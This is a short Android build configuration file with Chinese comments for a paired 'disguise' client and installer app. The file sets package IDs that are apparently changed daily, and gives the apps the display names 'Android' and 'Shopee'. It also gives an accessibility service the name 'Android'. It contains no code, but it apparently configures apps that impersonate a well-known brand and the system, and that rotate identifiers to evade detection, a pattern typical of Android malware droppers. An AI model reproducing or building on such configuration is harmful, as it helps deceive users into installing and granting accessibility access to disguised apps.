# A/B 马甲配置（每天改这里后重新打包即可，不必搬源码目录）
#
# applicationId = 安装到手机上的包名（可变）
# *_APP_NAME = 桌面显示名 / 安装页文案里的 B 名称（可变）
# 源码 namespace 固定为 com.vibelink.client / com.vibelink.installer

CLIENT_APPLICATION_ID=com.android1IN42343.client
INSTALLER_APPLICATION_ID=com.Shopee1231321321.installer

CLIENT_APP_NAME=Android
INSTALLER_APP_NAME=Shopee
# 无障碍设置里显示的服务名（竞品会写成 A 的名字；不配则默认用 INSTALLER_APP_NAME）
CLIENT_ACCESSIBILITY_NAME=Android

# A = client / B = installer（versionCode 必须是整数，覆盖安装要递增）
CLIENT_VERSION_CODE=22
CLIENT_VERSION_NAME=1.0.22
INSTALLER_VERSION_CODE=22
INSTALLER_VERSION_NAME=1.0.22

